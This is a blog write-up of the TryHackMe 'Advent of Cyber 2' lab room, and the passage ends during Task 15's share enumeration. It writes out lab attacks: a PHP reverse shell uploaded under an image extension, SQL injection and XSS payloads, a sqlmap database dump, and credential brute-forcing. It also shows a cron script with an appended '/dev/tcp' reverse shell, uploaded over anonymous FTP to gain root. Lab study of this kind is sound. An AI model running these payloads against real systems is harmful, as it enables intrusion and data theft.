---
title: Writeup for TryHackMe room - Advent of Cyber 2
author: 4n3i5v74
date: 2021-05-04 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, network, protocols, web, database, binary, privesc, osint, cloud, encryption]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [Advent of Cyber 2](https://tryhackme.com/room/adventofcyber2){:target="_blank"}

This room contains info and methods to recon and enumerate network captures, protocols, web servers, databases, binaries and SUID, privilege escalations, osint, cloud and encryption.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}


## Task 6 - Day 1 - Web Exploitation - A Christmas Crisis

This task is about using `nmap` to get web service info and using cookie manipulation to bypass login.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=BJF84oWHmok&ab_channel=JohnHammond){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}
- [Cyberchef](https://gchq.github.io/CyberChef/){:target="_blank"}


Using `nmap`, perform basic recon and get listening ports.
{% capture code %}{% raw %}nmap -Pn -T4 -sS --reason --open -F <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-15 03:27 GMT

Nmap scan report for <hostname> (<ip>)
Host is up, received arp-response (0.00070s latency).
Not shown: 98 filtered ports, 1 closed port
Reason: 88 no-responses, 10 admin-prohibiteds and 1 reset
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack ttl 64
MAC Address: 02:35:FC:72:6D:75 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 5.40 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `firefox` to register and login.
{% capture code %}{% raw %}http://<ip>
  - register
    - login{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `firefox` to inspect cookie after logging in.
{% capture code %}{% raw %}http://<ip>
  - login
    - inspect page
    - storage
      - cookie (auth){% endraw %}{% endcapture %} {% include code.html code=code%}

The cookie will have numbers `0-9` and letters `a-f`, which denotes it is a hexadecimal encoded string. Using `cyberchef` from `firefox` the same can be decoded.
{% capture code %}{% raw %}From Hex
  - Input - <hex-code>{% endraw %}{% endcapture %} {% include code.html code=code%}

There will be a `json` output obtained from encoded hex code.
{% capture code %}{% raw %}{"company":"The Best Festival Company", "<key>":"<value>"}{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `cyberchef` to manipulate hex decoded value and create new encoded hex data.
{% capture code %}{% raw %}To Hex
  - Input - <hex-value>{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `firefox` to login and send new manipulated cookie.
{% capture code %}{% raw %}http://<ip>
  - login
    - inspect page
    - storage
      - cookie (auth)
      - replace existing value with manipulated hex code
  - reload
    - activate all controls
    - <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}


## Task 7 - Day 2 - Web Exploitation - The Elf Strikes Back

This task is about using `gobuster` to brute-force upload directory and upload `php-reverse-shell` to gain shell access from web site.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=F_nTIX-q32k&){:target="_blank"}
- [Gobuster Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-gobuster){:target="_blank"}
- [Gobuster Reference](https://4n3i5v74.github.io/posts/cheatsheet-gobuster/){:target="_blank"}
- [PHP Reverse Shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php){:target="_blank"}


Use `firefox` to append ID `ODIzODI5MTNiYmYw` and access the upload page.
{% capture code %}{% raw %}http://<ip>/?id=ODIzODI5MTNiYmYw
  - inspect page{% endraw %}{% endcapture %} {% include code.html code=code%}

The source code contains a hint `<input type="file" id="chooseFile" accept=".jpeg,.jpg,.png">` of file extensions which are accepted for uploads.

Use `gobuster` to get directories that store uploaded files. Check the redirected entry from the output.
{% capture code %}{% raw %}gobuster dir -u <ip> -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -q --wildcard | grep upload{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}/<dir> (Status: 301){% endraw %}{% endcapture %} {% include code.html code=code%}

Download [php-reverse-shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php){:target="_blank"} or copy from kali webshells.
{% capture code %}{% raw %}cp /usr/share/webshells/php/php-reverse-shell.php php-reverse-shell.jpg.php{% endraw %}{% endcapture %} {% include code.html code=code%}

Edit the `php-reverse-shell` file and update the localhost ip.
{% capture code %}{% raw %}vim php-reverse-shell.jpg.php
$ip = '<local-ip>'{% endraw %}{% endcapture %} {% include code.html code=code%}

Create a `netcat` reverse shell to listen from the php reverse shell payload.
{% capture code %}{% raw %}nc -lnvp 1234{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `firefox` to upload the modified `php-reverse-shell`.
{% capture code %}{% raw %}http://<ip>/?id=ODIzODI5MTNiYmYw
  - select
    - php-reverse-shell.jpg.php
    - submit{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained in the `netcat` reverse shell session. Check contents of file `/var/www/flag.txt` for the flag.
{% capture code %}{% raw %}Listening on [0.0.0.0] (family 0, port 1234)
Connection from <ip> 45520 received!
Linux security-server 4.18.0-193.28.1.el8_2.x86_64 #1 SMP Thu Oct 22 00:20:22 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
12:18:09 up  1:44,  0 users,  load average: 0.00, 1.24, 1.59
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)

sh-4.4$ cat /var/www/flag.txt
cat /var/www/flag.txt
  <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}


## Task 8 - Day 3 - Web Exploitation - Christmas Chaos

This task is about using `burpsuite` to brute-force payloads using commonly used usernames and passwords.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=cQq6xPCZFjg&){:target="_blank"}


Use `burpsuite` to manipulate login credentials.
- Open `firefox` and set proxy `127.0.0.1:8080`
- Open `burpsuite` and turn `intercept on`
- Use `firefox` to login to `http://<ip>` using any dummy credentials
- In `Burpsuite`, in `proxy` tab, select the content and `send to intruder`
- In `Burpsuite`, in `intruder` tab, and in `positions` tab, select `username` and `password`, select `cluster bomb`
- In `Burpsuite`, in `intruder` tab, and in `payloads` tab, in `set 1`, add `root`, `admin`, and `user`, and in `set 2`, add `password`, `admin and `12345`, and `start attack`
- From the results in `Burpsuite`, get the credentials and login to `http://<ip>` using `firefox` to get the `flag`
- Quit `burpsuite` and reverse proxy setting in `firefox`


## Task 9 - Day 4 - Web Exploitation - Santa's Watching

This task is about using `gobuster` to find hidden directory containing backups and using `wfuzz` to fuzz out page containing valid backup files.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=7GAFQdYCk5s){:target="_blank"}
- [TryHackMe supporting wordlist](https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist){:target="_blank"}
- [Gobuster Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-gobuster){:target="_blank"}
- [Gobuster Reference](https://4n3i5v74.github.io/posts/cheatsheet-gobuster/){:target="_blank"}
- [Wordlist Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#wordlists---rockyou){:target="_blank"}


Use `firefox` to check the website `http://<ip>`.

Using `gobuster` and `dirb` wordlists, find the child directories under web root.
{% capture code %}{% raw %}gobuster dir -u http://<ip> -w /usr/share/wordlists/dirb/big.txt -q --wildcard{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}/.htpasswd (Status: 403)
/.htaccess (Status: 403)
/LICENSE (Status: 200)
/<dir> (Status: 301)
/server-status (Status: 403){% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to check the website `http://<ip>/<dir>`. There will be a file `site-log.php` available.

Use `wget` to download the custom wordlist and perform date fuzzing using `wfuzz`.
{% capture code %}{% raw %}wget https://assets.tryhackme.com/additional/cmn-aoc2020/day-4/wordlist
wfuzz -c -z file,wordlist http://<ip>/<dir>/site-log.php?date=FUZZ{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}* Wfuzz 2.2.9 - The Web Fuzzer                         *

Target: http://<ip>/<dir>/site-log.php?date=FUZZ
Total requests: 63

ID	Response   Lines      Word         Chars          Payload

000018:  C=200      0 L	       0 W	      0 Ch	  "20201117"
000019:  C=200      0 L	       0 W	      0 Ch	  "20201118"
000021:  C=200      0 L	       0 W	      0 Ch	  "20201120"
000020:  C=200      0 L	       0 W	      0 Ch	  "20201119"
000022:  C=200      0 L	       0 W	      0 Ch	  "20201121"
000023:  C=200      0 L	       0 W	      0 Ch	  "20201122"
000024:  C=200      0 L	       0 W	      0 Ch	  "20201123"
000025:  C=200      0 L	       0 W	      0 Ch	  "20201124"
000026:  C=200      0 L	       1 W	     13 Ch	  "20201125"
000027:  C=200      0 L	       0 W	      0 Ch	  "20201126"
000028:  C=200      0 L	       0 W	      0 Ch	  "20201127"
000029:  C=200      0 L	       0 W	      0 Ch	  "20201128"
000030:  C=200      0 L	       0 W	      0 Ch	  "20201129"
000031:  C=200      0 L	       0 W	      0 Ch	  "20201130"
000032:  C=200      0 L	       0 W	      0 Ch	  "20201201"
000033:  C=200      0 L	       0 W	      0 Ch	  "20201202"
000034:  C=200      0 L	       0 W	      0 Ch	  "20201203"
000035:  C=200      0 L	       0 W	      0 Ch	  "20201204"
000036:  C=200      0 L	       0 W	      0 Ch	  "20201205"
000038:  C=200      0 L	       0 W	      0 Ch	  "20201207"
000037:  C=200      0 L	       0 W	      0 Ch	  "20201206"
000039:  C=200      0 L	       0 W	      0 Ch	  "20201208"
000049:  C=200      0 L	       0 W	      0 Ch	  "20201218"
000040:  C=200      0 L	       0 W	      0 Ch	  "20201209"
000041:  C=200      0 L	       0 W	      0 Ch	  "20201210"
000042:  C=200      0 L	       0 W	      0 Ch	  "20201211"
000043:  C=200      0 L	       0 W	      0 Ch	  "20201212"
000044:  C=200      0 L	       0 W	      0 Ch	  "20201213"
000045:  C=200      0 L	       0 W	      0 Ch	  "20201214"
000046:  C=200      0 L	       0 W	      0 Ch	  "20201215"
000047:  C=200      0 L	       0 W	      0 Ch	  "20201216"
000048:  C=200      0 L	       0 W	      0 Ch	  "20201217"
000050:  C=200      0 L	       0 W	      0 Ch	  "20201219"
000051:  C=200      0 L	       0 W	      0 Ch	  "20201220"
000052:  C=200      0 L	       0 W	      0 Ch	  "20201221"
000053:  C=200      0 L	       0 W	      0 Ch	  "20201222"
000054:  C=200      0 L	       0 W	      0 Ch	  "20201223"
000055:  C=200      0 L	       0 W	      0 Ch	  "20201224"
000057:  C=200      0 L	       0 W	      0 Ch	  "20201226"
000056:  C=200      0 L	       0 W	      0 Ch	  "20201225"
000058:  C=200      0 L	       0 W	      0 Ch	  "20201227"
000001:  C=200      0 L	       0 W	      0 Ch	  "20201100"
000003:  C=200      0 L	       0 W	      0 Ch	  "20201102"
000002:  C=200      0 L	       0 W	      0 Ch	  "20201101"
000004:  C=200      0 L	       0 W	      0 Ch	  "20201103"
000005:  C=200      0 L	       0 W	      0 Ch	  "20201104"
000006:  C=200      0 L	       0 W	      0 Ch	  "20201105"
000007:  C=200      0 L	       0 W	      0 Ch	  "20201106"
000008:  C=200      0 L	       0 W	      0 Ch	  "20201107"
000009:  C=200      0 L	       0 W	      0 Ch	  "20201108"
000010:  C=200      0 L	       0 W	      0 Ch	  "20201109"
000011:  C=200      0 L	       0 W	      0 Ch	  "20201110"
000012:  C=200      0 L	       0 W	      0 Ch	  "20201111"
000013:  C=200      0 L	       0 W	      0 Ch	  "20201112"
000014:  C=200      0 L	       0 W	      0 Ch	  "20201113"
000015:  C=200      0 L	       0 W	      0 Ch	  "20201114"
000016:  C=200      0 L	       0 W	      0 Ch	  "20201115"
000017:  C=200      0 L	       0 W	      0 Ch	  "20201116"
000059:  C=200      0 L	       0 W	      0 Ch	  "20201228"
000060:  C=200      0 L	       0 W	      0 Ch	  "20201229"
000061:  C=200      0 L	       0 W	      0 Ch	  "20201230"
000062:  C=200      0 L	       0 W	      0 Ch	  "20201231"
000063:  C=200      0 L	       0 W	      0 Ch	  ""

Total time: 0.109613
Processed Requests: 63
Filtered Requests: 0
Requests/sec.: 574.7446{% endraw %}{% endcapture %} {% include code.html code=code %}

The date `20201125` contains characters, and we can query using the date in `firefox` to get the flag.
{% capture code %}{% raw %}http://<ip>/<dir>/site-log.php?date=20201125{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 10 - Day 5 - Web Exploitation - Someone stole Santa's gift list

This page is about using `sql injection` payloads to bypass login and use `burpsuite` to save web page requests and use `sqlmap` to dump database contents using the web page requests.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=Kitx7cSNsuE){:target="_blank"}
- [TryHackMe supporting room](https://tryhackme.com/room/sqlibasics){:target="_blank"}
- [SQL Commands](https://www.codecademy.com/articles/sql-commands){:target="_blank"}
- [SQLMap Cheatsheet](https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet){:target="_blank"}
- [SQL Injection Payload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection){:target="_blank"}
- [SQL Injection Payload](https://github.com/payloadbox/sql-injection-payload-list){:target="_blank"}


Use `firefox` to load the url `http://<ip>:3000` and check the page.

Use `firefox` to load the url `http://<ip>:3000`. The page will show the sql payload translation given in password tab.
{% capture code %}{% raw %}username - test
password - anything') or true; --{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}SELECT * FROM users
  WHERE username = 'test'
  AND password = MD5('anything') or true; -- '){% endraw %}{% endcapture %} {% include code.html code=code %}

Using payload `') or 1=1; --` will give sql payload translation as below.
{% capture code %}{% raw %}SELECT * FROM users
  WHERE username = 'test'
  AND password = MD5('') or 1=1; -- '){% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to load `<ip>:3000/init.php` to reset the database.

The following things are of interest in `sql injection`.
{% capture code %}{% raw %}database()
user()
@@version
username
password
table_name
column_name{% endraw %}{% endcapture %} {% include code.html code=code %}

Guess the hidden directory under `http://<ip>:8000` using the words `santa secret login panel`.

Use `sql injection` as tried earlier in the hidden url `http://<ip>:8000/<hidden>`. In place of `password`, use any of the below.
{% capture code %}{% raw %}') or true; --
' or true; --{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `burpsuite` to save panel request.
- Open `firefox` and set proxy `127.0.0.1:8080`
- Open `burpsuite` and turn `intercept on`
- Use `firefox` to try login to `http://<ip>:8000/<hidden>` using `sql injection` in `password` field
- In `Burpsuite`, in `proxy` tab, right click the content and `save as` `panel.request`
- Quit `burpsuite` and reverse proxy setting in `firefox`

Use `sqlmap` with the request file generated from `burpsuite` to dump database contents.
{% capture code %}{% raw %}sqlmap -r panel.results --tamper space2comment --dump-all --dbms sqlite --batch -v 0{% endraw %}{% endcapture %} {% include code.html code=code %}

An output similar to below will be obtained.
{% capture code %}{% raw %}[*] starting at 15:09:08

GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:

---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: search=test' UNION ALL SELECT 'qjqvq'||'OydnlsPDdtZoWxuordTuVxiabcCLWDEsqWDTuMym'||'qvxqq',NULL-- qtKp
---
back-end DBMS: SQLite

Database: SQLite_masterdb
Table: sequels
[22 entries]
+-------------+-----+----------------------------+
| kid         | age | title                      |
+-------------+-----+----------------------------+
| James       | 8   | shoes                      |
| John        | 4   | skateboard                 |
| Robert      | 17  | iphone                     |
| Michael     | 5   | playstation                |
| William     | 6   | xbox                       |
| David       | 6   | candy                      |
| Richard     | 9   | books                      |
| Joseph      | 7   | socks                      |
| Thomas      | 10  | 10 McDonalds meals         |
| Charles     | 3   | toy car                    |
| Christopher | 8   | air hockey table           |
| Daniel      | 12  | lego star wars             |
| Matthew     | 15  | bike                       |
| Anthony     | 3   | table tennis               |
| Donald      | 4   | fazer chocolate            |
| Mark        | 17  | wii                        |
| Paul        | 9   | <wish>                     |
| James       | 8   | finnish-english dictionary |
| Steven      | 11  | laptop                     |
| Andrew      | 16  | rasberry pie               |
| Kenneth     | 19  | TryHackMe Sub              |
| Joshua      | 12  | chair                      |
+-------------+-----+----------------------------+

Database: SQLite_masterdb
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| <flag>                                  |
+-----------------------------------------+

Database: SQLite_masterdb
Table: users
[1 entry]
+----------+------------------+
| username | password         |
+----------+------------------+
| admin    | <password>       |
+----------+------------------+

[*] shutting down at 15:09:11{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 11 - Day 6 - Web Exploitation - Be careful with what you wish on a Christmas night

This task is about using `owasp zap` to perform automated scan to get valid queries for web site.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=cNYhpbUtkJw){:target="_blank"}
- [OWASP Input validation Cheat Sheet](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/Input_Validation_Cheat_Sheet.md){:target="_blank"}
- [XSS Injection Reference](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection){:target="_blank"}
- [XSS Payload List](https://github.com/payloadbox/xss-payload-list){:target="_blank"}


Use `firefox` to manipuate running test query.
{% capture code %}{% raw %}http://<ip>:5000/?q=test{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `owasp zap` to perform automated scan and get valid queries.
{% capture code %}{% raw %}http://<ip>:5000
Attack{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` to send payload queries generated by `owasp zap`.
{% capture code %}{% raw %}http://<ip>:5000/?q=
http://<ip>:5000/?q=</p><script>alert(1);</script><p>{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 12 - Day 7 - Networking - The Grinch Really Did Steal Christmas

This task is about using `wireshark` to understand filter methods and get encrypted/unencrypted data from various protocols.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=yZTPMoYY2CA){:target="_blank"}


Use `wireshark` to analyse `pcap1.pcap` file. Use the filter `icmp` to get just the packets related to icmp protocol. Use `http.request.method == GET` to get the http packets for GET method. Apart from the common favicons, index and fonts, there will be a blog post the user visited.

Use `wireshark` to analyse `pcap2.pcap` file. Use the filter `tcp.port == 21` to filter the ftp packets. Since `FTP` protocol is not encrypted communication, there will be a packet which contains plaintext password. Use `protocol hierarchy` in `statistics` to group packets according to their type and check which other protocol in the list is encrypted.

Use `wireshark` to analyse `pcap2.pcap` file.
{% capture code %}{% raw %}Statistics
  - Protocol Hierarchy
  - HTTP
    - Apply as filter
      - Selected
File
  - Export objects
    - HTTP{% endraw %}{% endcapture %} {% include code.html code=code%}

Unzip the file `unzip christmas.zip` to get the item mcskidy wished for.


## Task 13 - Day 8 - Networking - What's Under the Christmas Tree?

This task is about using `nmap` to discover ports and information about their services and using `nse` scripts.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=StmtQKoFiWg){:target="_blank"}
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}
- [Pentest standard](http://www.pentest-standard.org/index.php/Main_Page){:target="_blank"}
- [Emerging threats rules](https://rules.emergingthreats.net/){:target="_blank"}
- [PFsense](https://www.pfsense.org/){:target="_blank"}
- [Snort](https://www.snort.org/){:target="_blank"}
- [Suricata](https://suricata-ids.org/){:target="_blank"}


Create a host entry for the <ip> as below.
{% capture code %}{% raw %}vim /etc/hosts
  <ip>  tbfc.blog{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `nmap` to scan for open ports with automatic service detection and nse script run.
{% capture code %}{% raw %}nmap -Pn -T4 -sS --reason --open --top-ports 1000 -A <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting Nmap 7.60 ( https://nmap.org ) at 2021-01-20 03:15 GMT
Nmap scan report for tbfc.blog (<ip>)
Host is up, received arp-response (0.00083s latency).
Not shown: 997 closed ports
Reason: 997 resets
PORT     STATE SERVICE       REASON         VERSION
<port>/tcp   open  http          syn-ack ttl 64 Apache httpd 2.4.29 ((<OS>))
|_http-generator: Hugo 0.78.2
|_http-server-header: Apache/2.4.29 (<OS>)
|_http-title: TBFC&#39;s <website-type>
<port>/tcp open  ssh           syn-ack ttl 64 OpenSSH 7.6p1 <OS> 4<OS>0.3 (<OS> Linux; protocol 2.0)
| ssh-hostkey:
|   2048 cf:c9:99:d0:5c:09:27:cd:a1:a8:1b:c2:b1:d5:ef:a6 (RSA)
|   256 4c:d4:f9:20:6b:ce:fc:62:99:54:7d:c2:b4:b2:f2:b2 (ECDSA)
|_  256 d0:e6:72:18:b5:20:89:75:d5:69:74:ac:cc:b8:3b:9b (EdDSA)
<port>/tcp open  ms-wbt-server syn-ack ttl 64 xrdp
MAC Address: 02:40:D3:C4:50:2D (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.60%E=4%D=1/20%OT=80%CT=1%CU=37344%PV=Y%DS=1%DC=D%G=Y%M=0240D3%T
OS:M=6007A0BA%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=107%GCD=1%ISR=108%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms tbfc.blog (<ip>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 81.87 seconds{% endraw %}{% endcapture %} {% include code.html code=code%}


## Task 14 - Day 9 - Networking - Anyone can be Santa!

This task is about using `ftp` to and uploading a reverse shell payload to gain privilege shell.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=i-jqFYTPEV4){:target="_blank"}
- [Reverse Shell Cheat sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp){:target="_blank"}


Use `ftp` to login to the server using `anonymous` and check the public accessible files and folders.
{% capture code %}{% raw %}ftp <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Connected to <ip>.
220 Welcome to the TBFC FTP Server!.
Name (<ip>:root): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.{% endraw %}{% endcapture %} {% include code.html code=code%}

Check the files and folders and download any interesting files.
{% capture code %}{% raw %}ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 <folder>
drwxr-xr-x    2 0        0            4096 Nov 16 15:05 <folder>
drwxr-xr-x    2 0        0            4096 Nov 16 15:04 <folder>
drwxrwxrwx    2 65534    65534        4096 Nov 16 19:35 <folder>
226 Directory send OK.

ftp> cd <folder>
250 Directory successfully changed.

ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rwxr-xr-x    1 111      113           341 Nov 16 19:34 <script>.sh
-rw-rw-rw-    1 111      113            24 Nov 16 19:35 shoppinglist.txt
226 Directory send OK.

ftp> mget <script>.sh
mget <script>.sh? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for <script>.sh (341 bytes).
226 Transfer complete.
341 bytes received in 0.00 secs (108.7195 kB/s)

ftp> mget shoppinglist.txt
mget shoppinglist.txt? y
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for shoppinglist.txt (24 bytes).
226 Transfer complete.
24 bytes received in 0.00 secs (468.7500 kB/s)

ftp> exit
221 Goodbye.{% endraw %}{% endcapture %} {% include code.html code=code%}

Upon inspecting the `script` file downloaded, it looks like a scheduled task which runs every minute. Edit the file and append a reverse shell payload, so the file can be uploaded to ftp to gain reverse shell.
{% capture code %}{% raw %}#!/bin/bash

# Created by ElfMcEager to backup all of Santa's goodies!
# Santa likes to delete things, so this script will run every minute.
# But the script will only create a new backup file once a new day arrives.

# Create backups to include date DD/MM/YYYY
filename="backup_`date +%d`_`date +%m`_`date +%Y`.tar.gz";

# Backup FTP folder and store in elfmceager's home directory
tar -zcvf /home/elfmceager/$filename /opt/ftp

# TO-DO: Automate transfer of backups to backup server

# Add payload for reverse shell
bash -i >& /dev/tcp/<local-ip>/4444 0>&1{% endraw %}{% endcapture %} {% include code.html code=code%}

Using `netcat`, create a listener for reverse shell.
{% capture code %}{% raw %}nc -lnvp 4444{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `ftp` to login to the machine with user `anonymous` and upload the `script`.
{% capture code %}{% raw %}Connected to <ip>.

220 Welcome to the TBFC FTP Server!.
Name (<ip>:root): anonymous

230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> cd <folder>
250 Directory successfully changed.

ftp> mput <script>.sh
mput <script>.sh? y
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
383 bytes sent in 0.00 secs (9.3656 MB/s)

ftp> exit
221 Goodbye.{% endraw %}{% endcapture %} {% include code.html code=code%}

Check the `netcat` session for reverse shell to get spawned.
{% capture code %}{% raw %}Connection from <ip> 53622 received!
bash: cannot set terminal process group (1530): Inappropriate ioctl for device
bash: no job control in this shell

root@tbfc-ftp-01:~# ls
ls
flag.txt

root@tbfc-ftp-01:~# cat flag.txt
cat flag.txt
  <flag>{% endraw %}{% endcapture %} {% include code.html code=code%}


## Task 15 - Day 10 - Networking - Don't be sElfish!

This task is about using `enum4linux` to scan `samba` users and shares and using `smbclient` to exploit the share.


Use these links as references.
- [TryHackMe supporting material](https://www.youtube.com/watch?v=HscyCbModk4){:target="_blank"}
- [Enum4Linux Reference](https://4n3i5v74.github.io/posts/build-own-hacking-os/#install-enum4linux){:target="_blank"}


Use `enum4linux` to enumerate the user information from `samba` server.
{% capture code %}{% raw %}enum4linux -U <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 22 13:44:13 2021

Target Information

Target ........... <ip>
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


Enumerating Workgroup/Domain on <ip>

[+] Got domain/workgroup name: TBFC-SMB-01


Session Check on <ip>

[+] Server <ip> allows sessions using username '', password ''


Getting domain SID for <ip>

Domain Name: TBFC-SMB-01
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup


Users on <ip>

index: 0x1 RID: 0x3e8 acb: 0x00000010 Account: elfmcskidy	Name: 	Desc:
index: 0x2 RID: 0x3ea acb: 0x00000010 Account: elfmceager	Name: elfmceager	Desc:
index: 0x3 RID: 0x3e9 acb: 0x00000010 Account: elfmcelferson	Name: 	Desc:

user:[elfmcskidy] rid:[0x3e8]
user:[elfmceager] rid:[0x3ea]
user:[elfmcelferson] rid:[0x3e9]

enum4linux complete on Fri Jan 22 13:44:15 2021{% endraw %}{% endcapture %} {% include code.html code=code%}

Use `enum4linux` to enumerate the share information from `samba` server.
{% capture code %}{% raw %}enum4linux -S <ip>{% endraw %}{% endcapture %} {% include code.html code=code%}

An output similar to below will be obtained.
{% capture code %}{% raw %}Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Fri Jan 22 13:48:31 2021


Target Information

Target ........... <ip>
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


Enumerating Workgroup/Domain on <ip>

[+] Got domain/workgroup name: TBFC-SMB-01


Session Check on <ip>

[+] Server <ip> allows sessions using username '', password ''


Getting domain SID for <ip>

Domain Name: TBFC-SMB-01
Domain Sid: (NULL SID)
[+] Can't determine if host is part of domain or part of a workgroup


Share Enumeration on <ip>

    Sharename       Type      Comment
    ---------       ----      -------
    tbfc-hr         Disk      tbfc-hr
    tbfc-it         Disk      tbfc-it
    <share>         Disk      <share>
    IPC$            IPC       IPC Service (tbfc-smb server (Samba, Ubuntu))

